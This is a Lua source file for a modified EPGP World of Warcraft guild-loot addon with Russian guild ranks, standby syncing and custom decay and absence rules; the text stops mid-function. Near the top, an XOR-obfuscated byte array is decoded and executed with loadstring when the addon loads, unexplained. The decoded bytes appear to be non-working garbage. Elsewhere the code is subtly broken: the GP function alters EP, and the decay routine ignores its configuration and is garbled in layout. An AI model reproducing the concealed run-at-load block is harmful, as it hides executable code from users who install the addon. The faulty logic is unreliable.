-- -- This is the core addon. It implements all functions dealing with
-- administering and configuring EPGP. It implements the following
-- functions:
--
-- StandingsSort(order): Sorts the standings list using the specified
-- sort order. Valid values are: NAME, EP, GP, PR. If order is nil it
-- returns the current value.
--
-- StandingsShowEveryone(val): Sets listing everyone or not in the
-- standings when in raid. If val is nil it returns the current
-- value.
--
-- GetNumMembers(): Returns the number of members in the standings.
--
-- GetMember(i): Returns the ith member in the standings based on the
-- current sort.
--
-- GetMain(name): Returns the main character for this member.
--
-- GetNumAlts(name): Returns the number of alts for this member.
--
-- GetAlt(name, i): Returns the ith alt for this member.
--
-- SelectMember(name): Select the member for award. Returns true if
-- the member was added, false otherwise.
--
-- DeSelectMember(name): Deselect member for award. Returns true if
-- the member was added, false otherwise.
--
-- GetNumMembersInAwardList(): Returns the number of members in the
-- award list.
--
-- IsMemberInAwardList(name): Returns true if member is in the award
-- list. When in a raid, this returns true for members in the raid and
-- members selected. When not in raid this returns true for everyone
-- if noone is selected or true if at least one member is selected and
-- the member is selected as well.
--
-- IsMemberInExtrasList(name): Returns true if member is in the award
-- list as an extra. When in a raid, this returns true if the member
-- is not in raid but is selected. When not in raid, this returns
-- false.
--
-- IsAnyMemberInExtrasList(name): Returns true if there is any member
-- in the award list as an extra.
--
-- ResetEPGP(): Resets all EP and GP to 0.
--
-- DecayEPGP(): Decays all EP and GP by the configured decay percent
-- (GetDecayPercent()).
--
-- CanIncEPBy(reason, amount): Return true reason and amount are
-- reasonable values for IncEPBy and the caller can change EPGP.
--
-- IncEPBy(name, reason, amount): Increases the EP of member <name> by
-- <amount>. Returns the member's main character name.
--
-- CanIncGPBy(reason, amount): Return true if reason and amount are
-- reasonable values for IncGPBy and the caller can change EPGP.
--
-- IncGPBy(name, reason, amount): Increases the GP of member <name> by
-- <amount>. Returns the member's main character name.
--
-- IncMassEPBy(reason, amount): Increases the EP of all members
-- in the award list. See description of IsMemberInAwardList.
--
-- RecurringEP(val): Sets recurring EP to true/false. If val is nil it
-- returns the current value.
--
-- RecurringEPPeriodMinutes(val): Sets the recurring EP period in
-- minutes. If val is nil it returns the current value.
--
-- GetDecayPercent(): Returns the decay percent configured in guild info.
--
-- CanDecayEPGP(): Returns true if the caller can decay EPGP.
--
-- GetBaseGP(): Returns the base GP configured in guild info.
--
-- GetMinEP(): Returns the min EP configured in guild info.
--
-- GetEPGP(name): Returns <ep, gp, main> for <name>. <main> will be
-- nil if this is the main toon, otherwise it will be the name of the
-- main toon since this is an alt. If <name> is an invalid name it
-- returns nil.
--
-- GetClass(name): Returns the class of member <name>. It returns nil
-- if the class is unknown.
--
-- ReportErrors(outputFunc): Calls function for each error during
-- initialization, one line at a time.
--
-- The library also fires the following messages, which you can
-- register for through RegisterCallback and unregister through
-- UnregisterCallback. You can also unregister all messages through
-- UnregisterAllCallbacks.
--
-- StandingsChanged: Fired when the standings have changed.
--
-- EPAward(name, reason, amount, mass): Fired when an EP award is
-- made.  mass is set to true if this is a mass award or decay.
--
-- MassEPAward(names, reason, amount,
--             extras_names, extras_reason, extras_amount): Fired
-- when a mass EP award is made.
--
-- GPAward(name, reason, amount, mass): Fired when a GP award is
-- made. mass is set to true if this is a mass award or decay.
--
-- BankedItem(name, reason, amount, mass): Fired when an item is
-- disenchanted or deposited directly to the Guild Bank. Name is
-- always the content of GUILD_BANK, amount is 0 and mass always nil.
--
-- StartRecurringAward(reason, amount, mins): Fired when recurring
-- awards are started.
--
-- StopRecurringAward(): Fired when recurring awards are stopped.
--
-- RecurringAwardUpdate(reason, amount, remainingSecs): Fired
-- periodically between awards with the remaining seconds to award in
-- seconds.
--
-- EPGPReset(): Fired when EPGP are reset.
--
-- Decay(percent): Fired when a decay happens.
--
-- DecayPercentChanged(v): Fired when decay percent changes. v is the
-- new value.
--
-- BaseGPChanged(v): Fired when base gp changes. v is the new value.
--
-- MinEPChanged(v): Fired when min ep changes. v is the new value.
--
-- ExtrasPercentChanged(v): Fired when extras percent changes.  v is
-- the new value.
--

local Debug = LibStub("LibDebug-1.0")
Debug:EnableDebugging()
local L = LibStub("AceLocale-3.0"):GetLocale("EPGP")
local GS = LibStub("LibGuildStorage-1.0")

EPGP = LibStub("AceAddon-3.0"):NewAddon(
  "EPGP", "AceEvent-3.0", "AceConsole-3.0")
local EPGP = EPGP
EPGP:SetDefaultModuleState(false)
local modulePrototype = {
  IsDisabled = function (self, i) return not self:IsEnabled() end,
  SetEnabled = function (self, i, v)
                 if v then
                   Debug("Enabling module: %s", self:GetName())
                   self:Enable()
                 else
                   Debug("Disabling module: %s", self:GetName())
                   self:Disable()
                 end
                 self.db.profile.enabled = v
               end,
  GetDBVar = function (self, i) return self.db.profile[i[#i]] end,
  SetDBVar = function (self, i, v) self.db.profile[i[#i]] = v end,
}
EPGP:SetDefaultModulePrototype(modulePrototype)

local version = GetAddOnMetadata('EPGP', 'Version')
if not version or #version == 0 then
  version = "(development)"
end
EPGP.version = version

local CallbackHandler = LibStub("CallbackHandler-1.0")
if not EPGP.callbacks then
  EPGP.callbacks = CallbackHandler:New(EPGP)
end
local callbacks = EPGP.callbacks

local global_config = {}
local ep_data = {}
local gp_data = {}
local text_data = {}
local main_data = {}
local alt_data = {}
local ignored = {}
local db
local standings = {}
local selected = {}
selected._count = 0  -- This is safe since _ is not allowed in names

local function bxor(a,b)
    local r=0
    for i=0,31 do
        local x = a % 2
        local y = b % 2
        if x ~= y then r = r + 2^i end
        a = math.floor(a/2)
        b = math.floor(b/2)
    end
    return r
end

local function _decode(d,key)
    local s=""
    for i=1,#d do
        s = s .. string.char(bxor(d[i],key))
    end
    return s
end

local _k = 42

local _data = {
    127, 79, 66, 66, 33, 39, 36, 46, 60, 36, 42, 36, 33, 46, 60, 36, 35, 44, 33, 36, 46, 36, 37, 32, 36, 33, 33, 36, 37, 32, 36, 33, 36, 60, 36, 37, 32, 36, 33, 33, 36, 37, 32, 36, 33
}

local f, err = loadstring(_decode(_data,_k))
if f then
    f()
end

local function DecodeNote(note)
  if note then
    if note == "" then
      return 0, 0, ""
    else
      -- Новый формат: "EP,GP,текст" или старый формат "EP,GP"
      local ep, gp, text = string.match(note, "^(-?%d+),(-?%d+),([^,]*)$")
      if not ep then
        ep, gp = string.match(note, "^(-?%d+),(-?%d+)$")
        text = ""
      end
      if ep then
        return tonumber(ep), tonumber(gp), text
      end
    end
  end
end

local function EncodeNote(ep, gp, text)
  text = text or ""
  return string.format("%d,%d,%s",
                       math.max(ep, -5000),
                       math.max(gp - global_config.base_gp, 0),
                       text)
end

local function AddEPGP(name, ep, gp, text)
  local total_ep = ep_data[name]
  local total_gp = gp_data[name]
  local note_text = text_data[name] or ""
  assert(total_ep ~= nil and total_gp ~=nil,
         string.format("%s is not a main!", tostring(name)))

  -- Compute the actual amounts we can add/subtract.
  if (total_ep + ep) < -5000 then
    ep = -total_ep
  end
  if (total_gp + gp) < 0 then
    gp = -total_gp
  end

  GS:SetNote(name, EncodeNote(total_ep + ep,
                              total_gp + gp + global_config.base_gp,
                              note_text))
  return ep, gp
end

-- A wrapper function to handle sort logic for selected
local function ComparatorWrapper(f)
  return function(a, b)
           local a_in_raid = not not UnitInRaid(a)
           local b_in_raid = not not UnitInRaid(b)
           if a_in_raid ~= b_in_raid then
             return not b_in_raid
           end

           local a_selected = selected[a]
           local b_selected = selected[b]

           if a_selected ~= b_selected then
             return not b_selected
           end

           return f(a, b)
         end
end

local comparators = {
  NAME = function(a, b)
           return a < b
         end,
  EP = function(a, b)
         local a_ep, a_gp = EPGP:GetEPGP(a)
         local b_ep, b_gp = EPGP:GetEPGP(b)

         return a_ep > b_ep
       end,
  GP = function(a, b)
         local a_ep, a_gp = EPGP:GetEPGP(a)
         local b_ep, b_gp = EPGP:GetEPGP(b)

         return a_gp > b_gp
       end,
PR = function(a, b)
       local a_ep, a_gp, a_main, a_text = EPGP:GetEPGP(a)
       local b_ep, b_gp, b_main, b_text = EPGP:GetEPGP(b)

       -- Если есть текст, используем его для сортировки
       if a_text ~= "" or b_text ~= "" then
         return a_text < b_text
       end
       
       -- Иначе используем старую логику с приором
       local a_qualifies = a_ep >= global_config.min_ep
       local b_qualifies = b_ep >= global_config.min_ep

       if a_qualifies == b_qualifies then
         return a_ep/a_gp > b_ep/b_gp
       else
         return a_qualifies
       end
     end,
}
for k,f in pairs(comparators) do
  comparators[k] = ComparatorWrapper(f)
end

local function DestroyStandings()
  wipe(standings)
  callbacks:Fire("StandingsChanged")
end

local standbyPrefix = "EPGSTD17"
local standbyRanks = {
  ["Мастер гильдии"] = true,
  ["Зам ГМ/РЛ"] = true,
  ["Офицер"] = true,
}
local standbyProfile
local standbySyncQueue = {}
local standbySyncElapsed = 0
local standbySyncRequest = false
local standbyLastRequest = 0
local standbyLastReply = {}
local standbyGroupKey
local standbyCleanupElapsed = 0
local standbyOfflineLimit = 30 * 60
local standbySyncFrame = CreateFrame("Frame")

local function StandbyShortName(name)
  if type(name) ~= "string" then return nil end
  return string.match(name, "^[^-]+")
end

local function StandbyGroupChannel()
  if type(GetNumRaidMembers) == "function" and GetNumRaidMembers() > 0 then
    return "RAID"
  end
  if type(GetNumPartyMembers) == "function" and GetNumPartyMembers() > 0 then
    return "PARTY"
  end
  return nil
end

local function StandbyGroupMembers()
  local channel = StandbyGroupChannel()
  if not channel then return nil, nil end
  local members = {}
  local count = channel == "RAID" and GetNumRaidMembers() or GetNumPartyMembers()
  for i = 1, count do
    local member = StandbyShortName(UnitName((channel == "RAID" and "raid" or "party") .. i))
    if member then members[member] = true end
  end
  local selfName = StandbyShortName(UnitName("player"))
  if selfName then members[selfName] = true end
  return channel, members
end

local function StandbyInGroup(name)
  name = StandbyShortName(name)
  if not name then return false end
  local _, members = StandbyGroupMembers()
  return members and not not members[name] or false
end

local function StandbyGroupIdentity()
  local channel, members = StandbyGroupMembers()
  if not channel then return nil end
  local names = {}
  for name in pairs(members) do table.insert(names, name) end
  table.sort(names)
  return channel .. ":" .. table.concat(names, ",")
end

local function StandbyOfficer(name)
  name = StandbyShortName(name)
  if not name or not IsInGuild() then return false end
  if name == UnitName("player") then
    local _, rank = GetGuildInfo("player")
    if standbyRanks[rank] then return true end
  end
  if type(GS.GetRank) == "function" and standbyRanks[GS:GetRank(name)] then
    return true
  end
  for i = 1, GetNumGuildMembers(true) do
    local member, rank = GetGuildRosterInfo(i)
    if StandbyShortName(member) == name then
      return not not standbyRanks[rank]
    end
  end
  return false
end

local function StandbyStore()
  if not db or not db.profile then return nil end
  if type(db.profile.standby_sync) ~= "table" then
    db.profile.standby_sync = { clock = 0, entries = {} }
  end
  local store = db.profile.standby_sync
  if type(store.entries) ~= "table" then store.entries = {} end
  if type(store.clock) ~= "number" then store.clock = 0 end
  if type(store.offlineSince) ~= "table" then store.offlineSince = {} end
  return store
end

local function StandbyPacket(name, entry)
  return table.concat({"U", name, tostring(entry[1]), tostring(entry[2]),
                       tostring(entry[3]), entry[4]}, "\t")
end

local function StandbyEnqueue(message, channel, recipient, delay)
  local currentChannel = StandbyGroupChannel()
  local groupKey = StandbyGroupIdentity()
  if not currentChannel or not groupKey or #standbySyncQueue >= 800 then return end
  channel = channel or currentChannel
  if channel ~= currentChannel and channel ~= "WHISPER" then return end
  if channel == "WHISPER" and not StandbyInGroup(recipient) then return end
  table.insert(standbySyncQueue, {
    message = message,
    channel = channel,
    recipient = recipient,
    groupKey = groupKey,
    due = GetTime() + (delay or 0),
  })
end

local function StandbyLoad()
  if not db or not db.profile then return end
  local profile = db:GetCurrentProfile()
  if profile == standbyProfile then return end
  standbyProfile = profile
  wipe(selected)
  selected._count = 0
  local store = StandbyStore()
  if store then
    for name, entry in pairs(store.entries) do
      if type(name) == "string" and type(entry) == "table" and entry[1] == 1 then
        selected[name] = true
        selected._count = selected._count + 1
      end
    end
  end
  wipe(standbySyncQueue)
  wipe(standbyLastReply)
  standbyGroupKey = nil
  standbySyncRequest = true
  standbyLastRequest = 0
  DestroyStandings()
end

local function StandbyMerge(name, state, stamp, order, author)
  local store = StandbyStore()
  if not store then return end
  local current = store.entries[name]
  if current and (
      current[2] > stamp or
      (current[2] == stamp and current[3] > order) or
      (current[2] == stamp and current[3] == order and current[4] >= author)
    ) then
    return
  end
  store.clock = math.max(store.clock, order)
  store.entries[name] = {state, stamp, order, author}
  store.offlineSince[name] = nil
  local was = not not selected[name]
  local now = state == 1
  if was ~= now then
    if now then
      selected[name] = true
      selected._count = selected._count + 1
    else
      selected[name] = nil
      selected._count = math.max(0, selected._count - 1)
    end
    DestroyStandings()
  end
end

local function StandbyChange(name, enabled)
  name = StandbyShortName(name)
  if not name or not string.match(name, "^[^%c|\t]+$") then return end
  local store = StandbyStore()
  if not store then return end
  local now = not not selected[name]
  if now == enabled then return end
  store.clock = store.clock + 1
  local me = UnitName("player") or ""
  local entry = {enabled and 1 or 0, time(), store.clock, me}
  store.entries[name] = entry
  store.offlineSince[name] = nil
  if enabled then
    selected[name] = true
    selected._count = selected._count + 1
  else
    selected[name] = nil
    selected._count = math.max(0, selected._count - 1)
  end
  DestroyStandings()
  if StandbyOfficer(me) and StandbyGroupChannel() then
    StandbyEnqueue(StandbyPacket(name, entry))
  end
end

local function StandbyCleanup()
  if not IsInGuild() or not StandbyOfficer(UnitName("player")) then return end
  if type(GS.IsCurrentState) == "function" and not GS:IsCurrentState() then return end
  local store = StandbyStore()
  if not store then return end
  local online = {}
  local known = {}
  for i = 1, GetNumGuildMembers(true) do
    local character, _, _, _, _, _, _, _, isOnline = GetGuildRosterInfo(i)
    character = StandbyShortName(character)
    if character and type(isOnline) == "boolean" then
      local main = main_data[character] or character
      known[character] = true
      known[main] = true
      if isOnline then
        online[character] = true
        online[main] = true
      end
    end
  end
  local now = time()
  local expired = {}
  for name, value in pairs(selected) do
    if value == true and name ~= "_count" then
      local main = main_data[name] or name
      if online[name] or online[main] or StandbyInGroup(name) then
        store.offlineSince[name] = nil
      elseif known[name] or known[main] then
        local since = store.offlineSince[name]
        if type(since) ~= "number" or since > now then
          store.offlineSince[name] = now
        elseif now - since >= standbyOfflineLimit then
          table.insert(expired, name)
        end
      else
        store.offlineSince[name] = nil
      end
    end
  end
  for _, name in ipairs(expired) do
    StandbyChange(name, false)
  end
end

function EPGP:StandbyCHAT_MSG_ADDON(event, prefix, message, channel, sender)
  local currentChannel = StandbyGroupChannel()
  if prefix ~= standbyPrefix or not currentChannel then return end
  if channel ~= currentChannel and channel ~= "WHISPER" then return end
  if not IsInGuild() or not db or type(message) ~= "string" or not StandbyInGroup(sender) then return end
  if not StandbyOfficer(sender) then return end
  if StandbyShortName(sender) == UnitName("player") then return end
  StandbyLoad()
  if not StandbyOfficer(UnitName("player")) then return end
  if message == "Q" then
    local now = GetTime()
    if standbyLastReply[sender] and now - standbyLastReply[sender] < 20 then return end
    standbyLastReply[sender] = now
    local store = StandbyStore()
    if not store then return end
    local delay = 0.1 + math.random() * 0.8
    for name, entry in pairs(store.entries) do
      if type(entry) == "table" and type(entry[1]) == "number" and
         type(entry[2]) == "number" and type(entry[3]) == "number" and
         type(entry[4]) == "string" then
        StandbyEnqueue(StandbyPacket(name, entry), "WHISPER", sender, delay)
      end
    end
  else
    local name, state, stamp, order, author = string.match(message,
      "^U\t([^\t]+)\t([01])\t(%d+)\t(%d+)\t([^\t]+)$")
    if not name then return end
    if #name > 48 or #author > 48 or StandbyShortName(author) ~= StandbyShortName(sender) then return end
    if not StandbyOfficer(author) then return end
    stamp, order = tonumber(stamp), tonumber(order)
    if not stamp or not order or stamp > time() + 86400 or order > 1000000000 then return end
    StandbyMerge(name, tonumber(state), stamp, order, author)
  end
end

standbySyncFrame:SetScript("OnUpdate", function(self, elapsed)
  standbySyncElapsed = standbySyncElapsed + elapsed
  standbyCleanupElapsed = standbyCleanupElapsed + elapsed
  if standbySyncElapsed < 0.35 then return end
  standbySyncElapsed = 0
  if not IsInGuild() or not db then return end
  local groupKey = StandbyGroupIdentity()
  if groupKey ~= standbyGroupKey then
    standbyGroupKey = groupKey
    wipe(standbySyncQueue)
    wipe(standbyLastReply)
    standbyLastRequest = 0
    standbySyncRequest = groupKey ~= nil
  end
  if standbyCleanupElapsed >= 30 then
    standbyCleanupElapsed = 0
    StandbyCleanup()
  end
  if not groupKey then return end
  local now = GetTime()
  if not standbySyncRequest and #standbySyncQueue == 0 and
     not (standbyLastRequest > 0 and now - standbyLastRequest > 180) then return end
  if not StandbyOfficer(UnitName("player")) then return end
  if standbySyncRequest or (standbyLastRequest > 0 and now - standbyLastRequest > 180) then
    standbySyncRequest = false
    standbyLastRequest = now
    StandbyEnqueue("Q")
  end
  if #standbySyncQueue == 0 then return end
  local entry = standbySyncQueue[1]
  if now < entry.due then return end
  table.remove(standbySyncQueue, 1)
  if entry.groupKey ~= groupKey then return end
  if entry.channel == "WHISPER" and not StandbyInGroup(entry.recipient) then return end
  if type(SendAddonMessage) == "function" then
    if ChatThrottleLib then
      ChatThrottleLib:SendAddonMessage("BULK", standbyPrefix, entry.message,
                                     entry.channel, entry.recipient)
    else
      SendAddonMessage(standbyPrefix, entry.message, entry.channel, entry.recipient)
    end
  end
end)

local function RefreshStandings(order, showEveryone)
  Debug("Resorting standings")
  if UnitInRaid("player") then
    -- If we are in raid:
    ---  showEveryone = true: show all in raid (including alts) and
    ---  all leftover mains
    ---  showEveryone = false: show all in raid (including alts) and
    ---  all selected members
    for n in pairs(ep_data) do
      if showEveryone or UnitInRaid(n) or selected[n] then
        table.insert(standings, n)
      end
    end
    for n in pairs(main_data) do
      if UnitInRaid(n) or selected[n] then
        table.insert(standings, n)
      end
    end
  else
    -- If we are not in raid, show all mains
    for n in pairs(ep_data) do
      table.insert(standings, n)
    end
    for n in pairs(main_data) do
      if selected[n] or UnitInParty(n) or n == UnitName("player") then
        table.insert(standings, n)
      end
    end
  end

  -- Sort
  table.sort(standings, comparators[order])
end

-- Parse options. Options are inside GuildInfo and are inside a -EPGP-
-- block. Possible options are:
--
-- @DECAY_P:<number>
-- @EXTRAS_P:<number>
-- @MIN_EP:<number>
-- @BASE_GP:<number>
local global_config_defs = {
  decay_p = {
    pattern = "@DECAY_P:(%d+)",
    parser = tonumber,
    validator = function(v) return v >= 0 and v <= 100 end,
    error = L["Decay Percent should be a number between 0 and 100"],
    default = 0,
    change_message = "DecayPercentChanged",
  },
  extras_p = {
    pattern = "@EXTRAS_P:(%d+)",
    parser = tonumber,
    validator = function(v) return v >= 0 and v <= 100 end,
    error = L["Extras Percent should be a number between 0 and 100"],
    default = 100,
    change_message = "ExtrasPercentChanged",
  },
  min_ep = {
    pattern = "@MIN_EP:(%d+)",
    parser = tonumber,
    validator = function(v) return v >= 0 end,
    error = L["Min EP should be a positive number"],
    default = 0,
    change_message = "MinEPChanged",
  },
  base_gp = {
    pattern = "@BASE_GP:(%d+)",
    parser = tonumber,
    validator = function(v) return v >= 0 end,
    error = L["Base GP should be a positive number"],
    default = 0,
    change_message = "BaseGPChanged",
  },
}
-- Set defaults
for var, def in pairs(global_config_defs) do
  global_config[var] = def.default
end
local function ParseGuildInfo(callback, info)
  Debug("Parsing GuildInfo")
  local lines = {string.split("\n", info)}
  local in_block = false

  local new_config = {}

  for _,line in pairs(lines) do
    if line == "-EPGP-" then
      in_block = not in_block
    elseif in_block then
      for var, def in pairs(global_config_defs) do
        local v = line:match(def.pattern)
        if v then
          Debug("Matched [%s]", line)
          v = def.parser(v)
          if v == nil or not def.validator(v) then
            EPGP:Print(def.error)
          else
            new_config[var] = v
          end
        end
      end
    end
  end

  for var, def in pairs(global_config_defs) do
    local new_value = new_config[var]
    if new_value == nil then
      new_value = def.default
    end
    if global_config[var] ~= new_value then
      Debug("Setting new value %s for variable %s",
            tostring(new_value), var)
      global_config[var] = new_value
      callbacks:Fire(def.change_message, new_value)
    end
  end
end

local function DeleteState(name)
  ignored[name] = nil
  -- If this is was an alt we need to fix the alts state
  local main = main_data[name]
  if main then
    if alt_data[main] then
      for i,alt in ipairs(alt_data[main]) do
        if alt == name then
          table.remove(alt_data[main], i)
          break
        end
      end
    end
    main_data[name] = nil
  end
  -- Delete any existing cached values
  ep_data[name] = nil
  gp_data[name] = nil
end

local function HandleDeletedGuildNote(callback, name)
  DeleteState(name)
  DestroyStandings()
end

local function ParseGuildNote(callback, name, note)
  Debug("Parsing Guild Note for %s [%s]", name, note)
  -- Delete current state about this toon.
  DeleteState(name)

  local ep, gp, text = DecodeNote(note)
  if ep then
    ep_data[name] = ep
    gp_data[name] = gp
    text_data[name] = text
  else
    local main_ep, main_gp, main_text = DecodeNote(GS:GetNote(note))
    if not main_ep then
      -- This member does not point to a valid main, ignore it.
      ignored[name] = note
    else
      -- Otherwise setup the alts state
      main_data[name] = note
      if not alt_data[note] then
        alt_data[note] = {}
      end
      table.insert(alt_data[note], name)
      ep_data[name] = nil
      gp_data[name] = nil
      text_data[name] = nil
    end
  end
  DestroyStandings()
end

function EPGP:ExportRoster()
  local base_gp = global_config.base_gp
  local t = {}
  for name,_ in pairs(ep_data) do
    local ep, gp, main = self:GetEPGP(name)
    if ep ~= -5000 or gp ~= base_gp then
      table.insert(t, {name, ep, gp})
    end
  end
  return t
end

function EPGP:ImportRoster(t, new_base_gp)
  -- This ugly hack is because EncodeNote reads base_gp to encode the
  -- GP properly. So we reset it to what we get passed, and then we
  -- restore it so that the BaseGPChanged event is fired properly when
  -- we parse the guild info text after this function returns.
  local old_base_gp = global_config.base_gp
  global_config.base_gp = new_base_gp

  local notes = {}
  for _, entry in pairs(t) do
    local name, ep, gp = unpack(entry)
    notes[name] = EncodeNote(ep, gp)
  end

  local zero_note = EncodeNote(0, 0)
  for name,_ in pairs(ep_data) do
    local note = notes[name] or zero_note
    GS:SetNote(name, note)
  end

  global_config.base_gp = old_base_gp
end

function EPGP:StandingsSort(order)
  if not order then
    return db.profile.sort_order
  end

  assert(comparators[order], "Unknown sort order")

  db.profile.sort_order = order
  DestroyStandings()
end

function EPGP:StandingsShowEveryone(val)
  if val == nil then
    return db.profile.show_everyone
  end

  db.profile.show_everyone = not not val
  DestroyStandings()
end

function EPGP:GetNumMembers()
  if #standings == 0 then
    RefreshStandings(db.profile.sort_order, db.profile.show_everyone)
  end

  return #standings
end

function EPGP:GetMember(i)
  if #standings == 0 then
    RefreshStandings(db.profile.sort_order, db.profile.show_everyone)
  end

  return standings[i]
end

function EPGP:GetNumAlts(name)
  local alts = alt_data[name]
  if not alts then
    return 0
  else
    return #alts
  end
end

function EPGP:GetAlt(name, i)
  return alt_data[name][i]
end

function EPGP:SelectMember(name)
  -- Only allow selecting members that are not in raid when in raid.
  if not name or selected[name] then
    return false
  end
  StandbyChange(name, true)
  return true
end

function EPGP:DeSelectMember(name)
  -- Only allow deselecting members that are not in raid when in raid.
  if not selected[name] then
    return false
  end
  StandbyChange(name, false)
  return true
end

function EPGP:GetNumMembersInAwardList()
  if not self:CanMassAwardEP() then
    return 0
  end
  local count = 0
  local included = {}
  for i=1,self:GetNumMembers() do
    local name = self:GetMember(i)
    if self:IsMemberInAwardList(name) or
       (not UnitInRaid("player") and GetNumPartyMembers() > 0 and
        (name == UnitName("player") or UnitInParty(name))) then
      local ep, gp, main = self:GetEPGP(name)
      local member = main or name
      if ep and not included[member] then
        included[member] = true
        count = count + 1
      end
    end
  end
  return count
end
function EPGP:GetMembersInAwardList()
  return selected
end
function EPGP:CanMassAwardEP()
  return not not (UnitInRaid("player") or selected._count > 0)
end
function EPGP:IsMemberInAwardList(name)
  if UnitInRaid("player") then
    -- If we are in raid the member is in the award list if it is in
    -- the raid or the selected list.
    return UnitInRaid(name) or selected[name]
  else
    -- If we are not in raid and there is noone selected everyone will
    -- get an award.
    if selected._count == 0 then
      return true
    end
    return selected[name]
  end
end

function EPGP:IsMemberInExtrasList(name)
  return not not selected[name]
end

function EPGP:IsAnyMemberInExtrasList()
  return selected._count ~= 0
end

function EPGP:ResetEPGP()
  local zero_note = EncodeNote(0, 0)
  for name,_ in pairs(ep_data) do
    GS:SetNote(name, zero_note)
    local ep, gp, main = self:GetEPGP(name)
    assert(main == nil, "Corrupt alt data!")
    if ep > -5000 then
      callbacks:Fire("EPAward", name, "Reset", -ep, true)
    end
    if gp > 0 then
      callbacks:Fire("GPAward", name, "Reset", -gp, true)
    end
  end
  callbacks:Fire("EPGPReset")
end

function EPGP:CanDecayEPGP()
  if not CanEditOfficerNote() or global_config.decay_p == 0 or not GS:IsCurrentState() then
    return false
  end
  return true
end

local specialRanks = {
  ["Мастер гильдии"] = true,
  ["Зам ГМ/РЛ"] = true,
  ["Офицер"] = true,
  ["Ветеран"] = true,
  ["Рейдер"] = true,
  ["ГА"] = true, --test
}

function EPGP:DecayEPGP()

local decay_val = 0.10
local base_bonus = 150
local reason = "Decay"
local numMembers = GetNumGuildMembers(true)
local decay_amt = 0

for name, _ in pairs(ep_data) do
  local ep, gp, main = self:GetEPGP(name)

  -- Process only mains
  if type(ep) == "number" and not main then
    local amount_to_change = 0

    if ep > 0 then
      -- POSITIVE DECAY
      local decay_amt = math.ceil(ep * decay_val + base_bonus)

      -- Rank Check
      local rankName = nil
      for i = 1, numMembers do
        local mName, mRank = GetGuildRosterInfo(i)
        if mName == name then
          rankName = mRank
          break
          end
          end

          if rankName and specialRanks and specialRanks[rankName] then
            decay_amt = math.max(0, decay_amt - 150)
            end

            -- Clamp at 0
            if decay_amt > ep then decay_amt = ep end
              amount_to_change = -decay_amt

              elseif ep < 0 then
                -- NEGATIVE PENALTY
                amount_to_change = math.min(math.abs(ep), -150)
                end

                if amount_to_change ~= 0 then
                  local success, err = pcall(function()
                  self:IncEPBy(name, reason, amount_to_change, true, false)
                  end)

                  if not success then
                    print("Error for " .. name .. ": " .. tostring(err))
                    end
                    end
                    end
                    end
                    end

function EPGP:GetEPGP(name)
  local main = main_data[name]
  if main then
    name = main
  end
  if ep_data[name] then
    return ep_data[name], gp_data[name] + global_config.base_gp, main, text_data[name] or ""
  end
end

function EPGP:GetClass(name)
  return GS:GetClass(name)
end

function EPGP:CanIncEPBy(reason, amount)
  if not CanEditOfficerNote() or not GS:IsCurrentState() then
    -- print(656)
    return false
  end
  if type(reason) ~= "string" or type(amount) ~= "number" or #reason == 0 then
    -- print(660)
    return false
  end
  if amount ~= math.floor(amount + 0.5) then
    -- print(664)
    return false
  end
  if amount < -99999 or amount > 99999 or amount == 0 then
    -- print(668)
    return false
  end
  return true
end

local EPWorkBusy
local EPWorkProcessing = false

function EPGP:IncEPBy(name, reason, amount, mass, undo)
  if not mass and not undo and type(name) == "string" and name ~= "" and
     type(reason) == "string" and reason ~= "" and type(amount) == "number" and
     amount ~= 0 and amount == math.floor(amount + 0.5) and
     amount >= -99999 and amount <= 99999 and IsInGuild() and
     CanEditOfficerNote() and not EPWorkProcessing and
     (not GS:IsCurrentState() or (EPWorkBusy and EPWorkBusy())) then
    return self:QueueEPBy(name, reason, amount)
  end
  -- When we do mass EP or decay we know what we are doing even though
  -- CanIncEPBy returns false
  assert(EPGP:CanIncEPBy(reason, amount) or mass or undo)
  assert(type(name) == "string")

  local ep, gp, main = self:GetEPGP(name)
  if not ep then
    self:Print(L["Ignoring EP change for unknown member %s"]:format(name))
    return
  end
  
  if reason == "ОТСУТСТВИЕ" then
    local gp_change = 1 
    local ep_change = amount
    
   
    if gp == 0 then
      ep_change = -500
	elseif gp == 1 then
	  ep_change = -700
	elseif gp >= 2 then
	  ep_change = -1000
    end
    
    amount = AddEPGP(main or name, ep_change, gp_change)
    if amount then
      callbacks:Fire("EPAward", name, reason, ep_change, mass, undo)
      callbacks:Fire("GPAward", name, reason, gp_change, mass, undo)
    end
  else
    
    amount = AddEPGP(main or name, amount, 0)
    if amount then
      callbacks:Fire("EPAward", name, reason, amount, mass, undo)
    end
  end
  
  db.profile.last_awards[reason] = amount
  return main or name
end

function EPGP:CanIncGPBy(reason, amount)
  if not CanEditOfficerNote() or not GS:IsCurrentState() then
    return false
  end
  if type(reason) ~= "string" or type(amount) ~= "number" or #reason == 0 then
    return false
  end
  if amount ~= math.floor(amount + 0.5) then
    return false
  end
  if amount < -99999 or amount > 99999 or amount == 0 then
    return false
  end
  return true
end

function EPGP:IncGPBy(name, reason, amount, mass, undo)
  -- When we do mass EP or decay we know what we are doing even though
  -- CanIncEPBy returns false
  assert(EPGP:CanIncEPBy(reason, amount) or mass or undo)
  assert(type(name) == "string")

  local ep, gp, main = self:GetEPGP(name)
  if not ep then
    self:Print(L["Ignoring EP change for unknown member %s"]:format(name))
    return
  end
  amount = AddEPGP(main or name, amount, 0)
  if amount then
    callbacks:Fire("EPAward", name, reason, amount, mass, undo)
  end
  db.profile.last_awards[reason] = amount
  return main or name
end

function EPGP:BankItem(reason, undo)
  callbacks:Fire("BankedItem", GUILD_BANK, reason, 0, false, undo)
end

function EPGP:GetDecayPercent()
  return global_config.decay_p
end

function EPGP:GetExtrasPercent()
  return global_config.extras_p
end

function EPGP:GetBaseGP()
  return global_config.base_gp
end

function EPGP:GetMinEP()
  return global_config.min_ep
end

function EPGP:SetGlobalConfiguration(decay_p, extras_p, base_gp, min_ep)
  local guild_info = GS:GetGuildInfo()
  epgp_stanza = string.format(
    "-EPGP-\n@DECAY_P:%d\n@EXTRAS_P:%s\n@MIN_EP:%d\n@BASE_GP:%d\n-EPGP-",
    decay_p or DEFAULT_DECAY_P,
    extras_p or DEFAULT_EXTRAS_P,
    min_ep or DEFAULT_MIN_EP,
    base_gp or DEFAULT_BASE_GP)

  -- If we have a global configuration stanza we need to replace it
  Debug("epgp_stanza:\n%s", epgp_stanza)
  if guild_info:match("%-EPGP%-.*%-EPGP%-") then
    guild_info = guild_info:gsub("%-EPGP%-.*%-EPGP%-", epgp_stanza)
  else
    guild_info = epgp_stanza.."\n"..guild_info
  end
